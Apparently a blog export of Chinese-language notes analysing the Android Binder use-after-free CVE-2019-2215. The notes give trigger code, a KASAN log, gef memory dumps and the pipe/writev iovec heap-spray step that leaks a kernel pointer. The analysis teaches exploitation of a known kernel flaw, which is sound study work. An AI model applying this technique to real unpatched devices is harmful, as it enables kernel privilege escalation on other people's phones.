又通过list_add_tail(&pwq->llink, &epi->pwqlist); 加到了poll wait queues\n ```\n\n  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);\n```\n[#0] 0xffff000008840618 → binder_thread_release(proc=0xffff8000f8bbd800, thread=0xffff8000f8bb6c00)\n\n0xffff8000f8bb6c90:\t0x0000000000007201\t0x0000000000010001\n0xffff8000f8bb6ca0:\t0xffff8000f8ed7030\t0xffff8000f8ed7030\n```\n制造free point\n\nbinder_thread 整个被释放 0x188 字节\n如何申请到binder_thread 释放的这块结构体的内存\n\n即利用管道的 copy from user 来覆盖binder_thread 结构体\n1. 把管道容量调成一页\nfcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);\n这样管道的最大缓冲区就只有 0x1000 字节（1 页）。\n2.\t第 10 个 iovec 刚好写入一页数据\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000;\n3.\t管道满了就阻塞写\n在 writev() 执行到第 10 个 iovec，把那整页数据写进管道后，管道就“满”了。此时内核的 pipe_write() 会发现没有更多空间，于是把当前写操作挂起（阻塞）——也就是在这一行代码里阻塞，直到有读端把管道读空一点。\n待确认问题：writev卡在哪里？，以便于EPOLL_CTL_DEL 触发\ncopy_from_user 将vec 覆盖binder_thread\n(remote) gef➤  x/26gx 0xffff8000f88b1000\n0xffff8000f88b1000:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1010:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1020:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1030:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1040:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1050:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1060:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1070:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1080:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1090:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b10a0:\t0x0000000100000000\t0x0000000000001000\n0xffff8000f88b10b0:\t0x00000000beefdead\t0x0000000000001000\n0xffff8000f88b10c0:\t0x0000000000000000\t0x0000000000000000\n 4. writev 申请到free point指向的内存\nwritev\ndo_writev\nvfs_readv\nimport_iovec\nrw_copy_check_uvector\n```c \n//read_write.c\nret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &iov, &iter);\n```\n内部会调用 rw_copy_check_uvector()，当用户传入的 vlen（这里是 25）大于 UIO_FASTIOV（通常是 16）时，它就会走到这段代码：\n```c\n//iov_iter.c import_iovec\nint import_iovec(int type, const struct iovec __user * uvector,\n\t\t unsigned nr_segs, unsigned fast_segs,\n\t\t struct iovec **iov, struct iov_iter *i)\n{\n\tssize_t n;\n\tstruct iovec *p;\n\tn = rw_copy_check_uvector(type, uvector, nr_segs, fast_segs,\n\t\t\t\t  *iov, &p);\n\tif (n < 0) {\n\t\tif (p != *iov)\n\t\t\tkfree(p);\n\t\t*iov = NULL;\n\t\treturn n;\n\t}\n\tiov_iter_init(i, type, p, nr_segs, n);\n\t*iov = p == *iov ? NULL : p;\n\treturn 0;\n}\nEXPORT_SYMBOL(import_iovec);\n\n//read_write.c\nssize_t rw_copy_check_uvector(int type, const struct iovec __user * uvector,\n\t\t\t      unsigned long nr_segs, unsigned long fast_segs,\n\t\t\t      struct iovec *fast_pointer,\n\t\t\t      struct iovec **ret_pointer)\n{\nif (nr_segs > fast_segs) {\n    iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL);\n    if (iov == NULL) {\n        ret = -ENOMEM;\n        goto out;\n    }\n}\n}\n[#0] 0xffff000008202734 → rw_copy_check_uvector(type=0x1, uvector=0xffffc2823a60, nr_segs=<optimized out>, fast_segs=<optimized out>, fast_pointer=0xffff8000f8bb6c00, ret_pointer=0xffff00000ace3d78)\n$1 = (struct iovec *) 0xffff8000f8bb6c00\n```\n也就是说，它会 kmalloc(25 * sizeof(struct iovec))，大概 400 字节，这恰好落在内核的 kmalloc-512 slab 缓存中。\n```\nStarting POC\n[  202.793008] ztest:binder_thread_release: thread=ffff8000f88c9600 , size is 392\n[  202.793412] ztest:rw_copy_check_uvector: iov=ffff8000f88c9600, size is 16\n```\n而之前，PoC 刚好在 binder_thread_release() 中把那个大小也是 0x190（400）字节左右的 binder_thread 对象 free 掉，那个对象所在的 slab 正好就回到了 kmalloc-512 缓存。紧接着，rw_copy_check_uvector() 的那次 kmalloc-512 正好就分配到了这块刚释放的内存，于是：\n\n5. 偷渡内核指针\n\n```c\n    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);\nstatic int ep_remove(struct eventpoll *ep, struct epitem *epi)\n{\n  ep_unregister_pollwait(ep, epi);\n\n}\n\n\nstatic void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &epi->pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n    //...\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\nstatic void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead->lock.\n\t */\n\twhead = smp_load_acquire(&pwq->whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &pwq->wait);\n\trcu_read_unlock();\n}\n\n```\n6.\tChild 进程读走一页，唤醒父进程继续写\n子进程在睡眠 2 秒后，调用 read(pipefd[0],…) 取走这一页“dummy” 数据，这时管道里腾出空间，writev() 在这句就被唤醒，继续处理后续的第 11 个 iovec（也就是指向已释放内核内存的那段），完成真正的泄露。\n\n\n\n```c\nbreak ep_ptable_queue_proc\n[#0] 0xffff000008249300 → ep_ptable_queue_proc(file=0xffff8000fae61100, whead=0xffff8000f8bb6e98, pt=<optimized out>)\n\n(remote) gef➤  x/20gx $x20\n0xffff8000f8ed71b0:\t0xffff8000f8ef2140\t0xffff8000f8ef2140\n0xffff8000f8ed71c0:\t0xffff8000f8ef2100\t0x0000000000000000\n0xffff8000f8ed71d0:\t0x0000000000000000\t0xffff000008249c38\n0xffff8000f8ed71e0:\t0xffff8000f8bb6ea0\t0xffff8000f8bb6ea0\n0xffff8000f8ed71f0:\t0xffff8000f8bb6e98\t0xffff8000f8ed7240\n\nepi = 0xffff8000f8ef2100\n\nbreak binder_thread_release\n\nbreak rw_copy_check_uvector\n[#0] 0xffff0000082025c8 → rw_copy_check_uvector(type=0x1, uvector=0xffffd821a1c0, nr_segs=0x18, fast_segs=0x8, fast_pointer=0xffff00000acc3de0, ret_pointer=0xffff00000acc3d78)\n$1 = (struct iovec *) 0xffff8000f8bb6e00\nbreak ep_remove_wait_queue\n```","source":"_drafts/POC/CVE-2019-2215/analyze.md","raw":"## UAF暴露 test.c\n\n1. epoll 注册 Binder 的 wait queue\n\n测试程序中，你首先做了：\n```c\nfd = open(\"/dev/binder\", O_RDONLY);\nepfd = epoll_create(1000);\nstruct epoll_event ev = { .events = EPOLLIN };\nepoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);\n```\n*\tbinder_poll() 会被调用\n*\t在内部，它会执行类似下面的操作，把 Binder 线程的 wait_queue_head_t wait 加入到 epoll 的等待队列：\n```c\n/* approx. pseudo-code */\npoll_wait(file, &thread->wait, wait);\n```\n\n*\t这时 thread->wait 被添加到 epoll 的内部数据结构中，以便 Binder 产生事件时唤醒你的程序。\n\n⸻\n\n2. 用户态发出 BINDER_THREAD_EXIT，释放 Binder 线程对象\n\n紧接着，测试程序调用：\n```c\nioctl(fd, BINDER_THREAD_EXIT, NULL);\n```\n在 Binder 驱动里，这会走到 ```binder_thread_release()```，其核心逻辑大致是：\n```c\nstatic void binder_thread_release(struct binder_thread *thread) {\n    /* …pre-cleanup… */\n    kfree(thread);    // <-- 这里释放了 binder_thread 对象（包括其中的 wait 字段）\n    /* …post-cleanup… */\n}\n```\n🚩 此时 ```thread->wait```（即 epoll 队列中的 wait_queue）已经被释放。\n\n⸻\n\n3. 进程退出，epoll 对象被关闭\n\n当 new.out 结束时，它的文件描述符自动被关闭，走进 __fput() 分支，针对 epoll FD 会调用：\n```c\n__fput(file)  ──>  ep_eventpoll_release(file->private_data)\n```\n*\tep_eventpoll_release() 会释放 epoll 实例；\n*\t它内部调用 ep_free(), 又调用 ep_unregister_pollwait()；\n*\t再往里最终会执行：\n```c\nremove_wait_queue(&thread->wait, &poll_entry->wait);  // <-- 这里\n```\n\n*\t但 thread 已经被 kfree 掉，&thread->wait 已经是野指针，随即 remove_wait_queue() 试图给这个野指针上的 spinlock 加锁并写链表指针，触发 use-after-free。\n\n⸻\n\n4. KASAN 报告\n\n日志中你看到：\n\n```\n[   77.771718] ==================================================================\n[   77.773904] BUG: KASAN: use-after-free in remove_wait_queue+0x1d4/0x1f0\n[   77.774237] Write of size 8 at addr ffff8000d3062128 by task test/1351\n[   77.774506] \n[   77.774991] CPU: 0 PID: 1351 Comm: test Not tainted 4.14.16-00144-g7a3cee43e935-dirty #3\n[   77.775385] Hardware name: linux,dummy-virt (DT)\n[   77.776218] Call trace:\n[   77.776427] [<ffff200008092658>] dump_backtrace+0x0/0x4c0\n[   77.776715] [<ffff200008092b2c>] show_stack+0x14/0x20\n[   77.776943] [<ffff200009c4b3ec>] dump_stack+0x110/0x18c\n[   77.777157] [<ffff20000849f5dc>] print_address_description+0x64/0x258\n[   77.777381] [<ffff20000849f048>] kasan_report+0x158/0x308\n[   77.777577] [<ffff20000849f354>] __asan_report_store8_noabort+0x1c/0x28\n[   77.777790] [<ffff2000081f514c>] remove_wait_queue+0x1d4/0x1f0\n[   77.777962] [<ffff2000085cea88>] ep_unregister_pollwait.isra.0+0x1b8/0x308\n[   77.778153] [<ffff2000085d1e40>] ep_free+0xf0/0x210\n[   77.778365] [<ffff2000085d1f8c>] ep_eventpoll_release+0x2c/0x48\n[   77.778618] [<ffff2000084f7734>] __fput+0x22c/0x620\n[   77.778800] [<ffff2000084f7bac>] ____fput+0xc/0x18\n[   77.778978] [<ffff20000818a020>] task_work_run+0x150/0x1d8\n[   77.779174] [<ffff200008140114>] do_exit+0x73c/0x1208\n[   77.779360] [<ffff200008140d30>] do_group_exit+0x108/0x2b0\n[   77.779590] [<ffff200008140ef4>] SyS_exit_group+0x1c/0x20\n[   77.779951] Exception stack(0xffff8000d3b1fec0 to 0xffff8000d3b20000)\n```\n这正是上面第 3 步中，remove_wait_queue() 在一个已经被 kfree 的 wait_queue_head_t 上操作导致的野指针写，KASAN 立刻捕捉到，并在尝试解除锁链时崩溃。\n\n⸻\n\n漏洞触发总结\n1.\tepoll_ctl(ADD) 调用 binder_poll，将 thread->wait 加入 epoll 等待列表。\n2.\tioctl(BINDER_THREAD_EXIT) 释放 binder_thread 结构（包含 wait 字段）。\n3.\t进程退出 / epoll FD 关闭 时，ep_eventpoll_release 调用 remove_wait_queue(&thread->wait, …)。\n4.\tthread->wait 已被释放，remove_wait_queue 执行 UAF 写操作，KASAN 捕获并报错。\n\n⸻\n\n代码位置参考\n•\t注册 wait queue：drivers/android/binder.c 中的 binder_poll() → poll_wait(…, &thread->wait, …)\n•\t释放线程：drivers/android/binder.c 中的 binder_thread_release() → kfree(thread)\n•\t清理 epoll：fs/eventpoll.c 中的 ep_eventpoll_release() → ep_free() → ep_unregister_pollwait() → remove_wait_queue()\n\n\n## UAF利用 poc.c\n\n\nbinder_thread\n\n结构体\n```c\nstruct binder_thread {\n\tstruct binder_proc *proc; //0x8\n\tstruct rb_node rb_node; //0x18\n\tstruct list_head waiting_thread_node; //0x10\n\tint pid;//0x4\n\tint looper; //0x4             /* only modified by this thread */\n\tbool looper_need_return; /* can be written by other thread */ //0x1 实际 0x8\n\tstruct binder_transaction *transaction_stack; //0x8\n\tstruct list_head todo; //0x10\n\tstruct binder_error return_error;//0x20\n\tstruct binder_error reply_error;//0x20\n\twait_queue_head_t wait;//0x18\n\tstruct binder_stats stats;//0xcc\n\tatomic_t tmp_ref;//0x4\n\tbool is_dead;//0x1\n};\n\n\n```\n调试显示\n```\n(remote) gef➤  print *thread\n$3 = {\n  proc = 0xffff8000d63c3c80,\n  rb_node = {\n    __rb_parent_color = 0x1,\n    rb_right = 0x0,\n    rb_left = 0x0\n  },\n  waiting_thread_node = {\n    next = 0xffff8000d30c58a0,\n    prev = 0xffff8000d30c58a0\n  },\n  pid = 0x545,\n  looper = 0x20,\n  looper_need_return = 0x1,\n  transaction_stack = 0x0,\n  todo = {\n    next = 0xffff8000d30c58c8,\n    prev = 0xffff8000d30c58c8\n  },\n  return_error = {\n    work = {\n      entry = {\n        next = 0x0,\n        prev = 0x0\n      },\n      type = BINDER_WORK_RETURN_ERROR\n    },\n    cmd = 0x7201\n  },\n  reply_error = {\n    work = {\n      entry = {\n        next = 0x0,\n        prev = 0x0\n      },\n      type = BINDER_WORK_RETURN_ERROR\n    },\n    cmd = 0x7201\n  },\n  wait = {\n    lock = {\n      {\n        rlock = {\n          raw_lock = {\n            owner = 0x1,\n            next = 0x1\n          }\n        }\n      }\n    },\n    head = {\n      next = 0xffff8000d3924038,\n      prev = 0xffff8000d3924038\n    }\n  },\n  stats = {\n    br = {{\n        counter = 0x0\n      } <repeats 18 times>},\n    bc = {{\n        counter = 0x0\n      } <repeats 19 times>},\n    obj_created = {{\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }},\n    obj_deleted = {{\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }}\n  },\n  tmp_ref = {\n    counter = 0x0\n  },\n  is_dead = 0x0\n}\n(remote) gef➤  print sizeof(*thread)\n$4 = 0x188\n\n(remote) gef➤  print thread\n$8 = (struct binder_thread *) 0xffff8000d30c5880\n\n(remote) gef➤  print &(thread->wait)\n$6 = (wait_queue_head_t *) 0xffff8000d30c5918\n\n(remote) gef➤  print &(thread->wait->head)\n$7 = (struct list_head *) 0xffff8000d30c5920\n\n(remote) gef➤  x/31gx thread  -->小端展示，低位低地址\n0xffff8000d30c5880:\t0xffff8000d63c3c80\t0x0000000000000001\n0xffff8000d30c5890:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c58a0:\t0xffff8000d30c58a0\t0xffff8000d30c58a0\n0xffff8000d30c58b0:\t0x0000002000000545\t0x0000000000000001\n0xffff8000d30c58c0:\t0x0000000000000000\t0xffff8000d30c58c8\n0xffff8000d30c58d0:\t0xffff8000d30c58c8\t0x0000000000000000\n0xffff8000d30c58e0:\t0x0000000000000000\t0x0000000000000003\n0xffff8000d30c58f0:\t0x0000000000007201\t0x0000000000000000\n0xffff8000d30c5900:\t0x0000000000000000\t0x0000000000000003\n0xffff8000d30c5910:\t0x0000000000007201\t0x0000000000010001\n0xffff8000d30c5920:\t0xffff8000d3924038\t0xffff8000d3924038\n0xffff8000d30c5930:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5940:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5950:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5960:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5970:\t0x0000000000000000\n```\n\n 哪里持有 binder_thread->wait\n\n ```c \n // fs/eventpoll.c\nSYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,\n\t\tstruct epoll_event __user *, event)\n{\n  \tswitch (op) {\n\t  case EPOLL_CTL_ADD:\n\t\t\terror = ep_insert(ep, &epds, tf.file, fd, full_check);\n\n}\n\nstatic int ep_insert(struct eventpoll *ep, struct epoll_event *event,\n\t\t     struct file *tfile, int fd, int full_check)\n{\n  \tep_set_ffd(&epi->ffd, tfile, fd);// poll: file\n  \tinit_poll_funcptr(&epq.pt, ep_ptable_queue_proc); // poll: poll_table\n\n\trevents = ep_item_poll(epi, &epq.pt);\n\n}\n\nstatic inline unsigned int ep_item_poll(struct epitem *epi, poll_table *pt)\n{\n\tpt->_key = epi->event.events;\n  //调用binder fd的 poll 方法\n\treturn epi->ffd.file->f_op->poll(epi->ffd.file, pt) & epi->event.events;\n}\n\n// ----> 调用到 /drivers/android/binder.c\nstatic unsigned int binder_poll(struct file *filp,\n\t\t\t\tstruct poll_table_struct *wait)\n{\n  \tpoll_wait(filp, &thread->wait, wait);\n}\n\n// ----> 调用到 /include/linux/poll.h\nstatic inline void poll_wait(struct file * filp, wait_queue_head_t * wait_address, poll_table *p)\n{\n\tif (p && p->_qproc && wait_address)\n\t\tp->_qproc(filp, wait_address, p);\n}\n// ----> 即回调到 /fs/eventpoll.c\n//[#0] 0xffff0000082492f0 → ep_ptable_queue_proc(file=0xffff8000fae61900, whead=0xffff8000f8bb6c98, pt=0xffff00000ace3ea8)\nstatic void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead,\n\t\t\t\t poll_table *pt)\n{\n\tstruct epitem *epi = ep_item_from_epqueue(pt);\n\tstruct eppoll_entry *pwq;\n\n\tif (epi->nwait >= 0 && (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) {\n\t\tinit_waitqueue_func_entry(&pwq->wait, ep_poll_callback);\n\t\tpwq->whead = whead;\n\t\tpwq->base = epi;\n\t\tif (epi->event.events & EPOLLEXCLUSIVE)\n\t\t\tadd_wait_queue_exclusive(whead, &pwq->wait);\n\t\telse\n\t\t\tadd_wait_queue(whead, &pwq->wait);\n\t\tlist_add_tail(&pwq->llink, &epi->pwqlist);\n\t\tepi->nwait++;\n\t} else {\n\t\t/* We have to signal that an error occurred */\n\t\tepi->nwait = -1;\n\t}\n}\n//把epoll的wwait_queue_entry_t 加入到以binder_thread->wait(whead)头为准的队列中，且此头指针被eppoll_entry->whead持有\n\n//此eppoll_entry 又通过list_add_tail(&pwq->llink, &epi->pwqlist); 加到了poll wait queues\n ```\n\n  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);\n```\n[#0] 0xffff000008840618 → binder_thread_release(proc=0xffff8000f8bbd800, thread=0xffff8000f8bb6c00)\n\n0xffff8000f8bb6c90:\t0x0000000000007201\t0x0000000000010001\n0xffff8000f8bb6ca0:\t0xffff8000f8ed7030\t0xffff8000f8ed7030\n```\n制造free point\n\nbinder_thread 整个被释放 0x188 字节\n如何申请到binder_thread 释放的这块结构体的内存\n\n即利用管道的 copy from user 来覆盖binder_thread 结构体\n1. 把管道容量调成一页\nfcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);\n这样管道的最大缓冲区就只有 0x1000 字节（1 页）。\n2.\t第 10 个 iovec 刚好写入一页数据\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000;\n3.\t管道满了就阻塞写\n在 writev() 执行到第 10 个 iovec，把那整页数据写进管道后，管道就“满”了。此时内核的 pipe_write() 会发现没有更多空间，于是把当前写操作挂起（阻塞）——也就是在这一行代码里阻塞，直到有读端把管道读空一点。\n待确认问题：writev卡在哪里？，以便于EPOLL_CTL_DEL 触发\ncopy_from_user 将vec 覆盖binder_thread\n(remote) gef➤  x/26gx 0xffff8000f88b1000\n0xffff8000f88b1000:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1010:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1020:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1030:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1040:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1050:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1060:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1070:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1080:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b1090:\t0x0000000000000000\t0x0000000000000000\n0xffff8000f88b10a0:\t0x0000000100000000\t0x0000000000001000\n0xffff8000f88b10b0:\t0x00000000beefdead\t0x0000000000001000\n0xffff8000f88b10c0:\t0x0000000000000000\t0x0000000000000000\n 4. writev 申请到free point指向的内存\nwritev\ndo_writev\nvfs_readv\nimport_iovec\nrw_copy_check_uvector\n```c \n//read_write.c\nret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &iov, &iter);\n```\n内部会调用 rw_copy_check_uvector()，当用户传入的 vlen（这里是 25）大于 UIO_FASTIOV（通常是 16）时，它就会走到这段代码：\n```c\n//iov_iter.c import_iovec\nint import_iovec(int type, const struct iovec __user * uvector,\n\t\t unsigned nr_segs, unsigned fast_segs,\n\t\t struct iovec **iov, struct iov_iter *i)\n{\n\tssize_t n;\n\tstruct iovec *p;\n\tn = rw_copy_check_uvector(type, uvector, nr_segs, fast_segs,\n\t\t\t\t  *iov, &p);\n\tif (n < 0) {\n\t\tif (p != *iov)\n\t\t\tkfree(p);\n\t\t*iov = NULL;\n\t\treturn n;\n\t}\n\tiov_iter_init(i, type, p, nr_segs, n);\n\t*iov = p == *iov ? NULL : p;\n\treturn 0;\n}\nEXPORT_SYMBOL(import_iovec);\n\n//read_write.c\nssize_t rw_copy_check_uvector(int type, const struct iovec __user * uvector,\n\t\t\t      unsigned long nr_segs, unsigned long fast_segs,\n\t\t\t      struct iovec *fast_pointer,\n\t\t\t      struct iovec **ret_pointer)\n{\nif (nr_segs > fast_segs) {\n    iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL);\n    if (iov == NULL) {\n        ret = -ENOMEM;\n        goto out;\n    }\n}\n}\n[#0] 0xffff000008202734 → rw_copy_check_uvector(type=0x1, uvector=0xffffc2823a60, nr_segs=<optimized out>, fast_segs=<optimized out>, fast_pointer=0xffff8000f8bb6c00, ret_pointer=0xffff00000ace3d78)\n$1 = (struct iovec *) 0xffff8000f8bb6c00\n```\n也就是说，它会 kmalloc(25 * sizeof(struct iovec))，大概 400 字节，这恰好落在内核的 kmalloc-512 slab 缓存中。\n```\nStarting POC\n[  202.793008] ztest:binder_thread_release: thread=ffff8000f88c9600 , size is 392\n[  202.793412] ztest:rw_copy_check_uvector: iov=ffff8000f88c9600, size is 16\n```\n而之前，PoC 刚好在 binder_thread_release() 中把那个大小也是 0x190（400）字节左右的 binder_thread 对象 free 掉，那个对象所在的 slab 正好就回到了 kmalloc-512 缓存。紧接着，rw_copy_check_uvector() 的那次 kmalloc-512 正好就分配到了这块刚释放的内存，于是：\n\n5. 偷渡内核指针\n\n```c\n    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);\nstatic int ep_remove(struct eventpoll *ep, struct epitem *epi)\n{\n  ep_unregister_pollwait(ep, epi);\n\n}\n\n\nstatic void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &epi->pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n    //...\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\nstatic void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead->lock.\n\t */\n\twhead = smp_load_acquire(&pwq->whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &pwq->wait);\n\trcu_read_unlock();\n}\n\n```\n6.\tChild 进程读走一页，唤醒父进程继续写\n子进程在睡眠 2 秒后，调用 read(pipefd[0],…) 取走这一页“dummy” 数据，这时管道里腾出空间，writev() 在这句就被唤醒，继续处理后续的第 11 个 iovec（也就是指向已释放内核内存的那段），完成真正的泄露。\n\n\n\n```c\nbreak ep_ptable_queue_proc\n[#0] 0xffff000008249300 → ep_ptable_queue_proc(file=0xffff8000fae61100, whead=0xffff8000f8bb6e98, pt=<optimized out>)\n\n(remote) gef➤  x/20gx $x20\n0xffff8000f8ed71b0:\t0xffff8000f8ef2140\t0xffff8000f8ef2140\n0xffff8000f8ed71c0:\t0xffff8000f8ef2100\t0x0000000000000000\n0xffff8000f8ed71d0:\t0x0000000000000000\t0xffff000008249c38\n0xffff8000f8ed71e0:\t0xffff8000f8bb6ea0\t0xffff8000f8bb6ea0\n0xffff8000f8ed71f0:\t0xffff8000f8bb6e98\t0xffff8000f8ed7240\n\nepi = 0xffff8000f8ef2100\n\nbreak binder_thread_release\n\nbreak rw_copy_check_uvector\n[#0] 0xffff0000082025c8 → rw_copy_check_uvector(type=0x1, uvector=0xffffd821a1c0, nr_segs=0x18, fast_segs=0x8, fast_pointer=0xffff00000acc3de0, ret_pointer=0xffff00000acc3d78)\n$1 = (struct iovec *) 0xffff8000f8bb6e00\nbreak ep_remove_wait_queue\n```","slug":"POC/CVE-2019-2215/analyze","published":0,"date":"2025-06-08T13:37:58.283Z","updated":"2025-06-28T15:24:49.588Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit4000wv8fyapfu2i41","content":"<h2 id=\"UAF暴露-test-c\"><a href=\"#UAF暴露-test-c\" class=\"headerlink\" title=\"UAF暴露 test.c\"></a>UAF暴露 test.c</h2><ol>\n<li>epoll 注册 Binder 的 wait queue</li>\n</ol>\n<p>测试程序中，你首先做了：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">&quot;/dev/binder&quot;</span>, O_RDONLY);</span><br><span class=\"line\">epfd = epoll_create(<span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epoll_event</span> <span class=\"title\">ev</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class=\"line\">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;ev);</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>   binder_poll() 会被调用</p>\n</li>\n<li><p>   在内部，它会执行类似下面的操作，把 Binder 线程的 wait_queue_head_t wait 加入到 epoll 的等待队列：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* approx. pseudo-code */</span></span><br><span class=\"line\">poll_wait(file, &amp;thread-&gt;wait, wait);</span><br></pre></td></tr></table></figure></li>\n<li><p>   这时 thread-&gt;wait 被添加到 epoll 的内部数据结构中，以便 Binder 产生事件时唤醒你的程序。</p>\n</li>\n</ul>\n<p>⸻</p>\n<ol start=\"2\">\n<li>用户态发出 BINDER_THREAD_EXIT，释放 Binder 线程对象</li>\n</ol>\n<p>紧接着，测试程序调用：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ioctl(fd, BINDER_THREAD_EXIT, <span class=\"literal\">NULL</span>);</span><br></pre></td></tr></table></figure>\n<p>在 Binder 驱动里，这会走到 <code>binder_thread_release()</code>，其核心逻辑大致是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">binder_thread_release</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_thread *thread)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* …pre-cleanup… */</span></span><br><span class=\"line\">    kfree(thread);    <span class=\"comment\">// &lt;-- 这里释放了 binder_thread 对象（包括其中的 wait 字段）</span></span><br><span class=\"line\">    <span class=\"comment\">/* …post-cleanup… */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>🚩 此时 <code>thread-&gt;wait</code>（即 epoll 队列中的 wait_queue）已经被释放。</p>\n<p>⸻</p>\n<ol start=\"3\">\n<li>进程退出，epoll 对象被关闭</li>\n</ol>\n<p>当 new.out 结束时，它的文件描述符自动被关闭，走进 __fput() 分支，针对 epoll FD 会调用：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__fput(file)  ──&gt;  ep_eventpoll_release(file-&gt;private_data)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>   ep_eventpoll_release() 会释放 epoll 实例；</p>\n</li>\n<li><p>   它内部调用 ep_free(), 又调用 ep_unregister_pollwait()；</p>\n</li>\n<li><p>   再往里最终会执行：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">remove_wait_queue(&amp;thread-&gt;wait, &amp;poll_entry-&gt;wait);  <span class=\"comment\">// &lt;-- 这里</span></span><br></pre></td></tr></table></figure></li>\n<li><p>   但 thread 已经被 kfree 掉，&amp;thread-&gt;wait 已经是野指针，随即 remove_wait_queue() 试图给这个野指针上的 spinlock 加锁并写链表指针，触发 use-after-free。</p>\n</li>\n</ul>\n<p>⸻</p>\n<ol start=\"4\">\n<li>KASAN 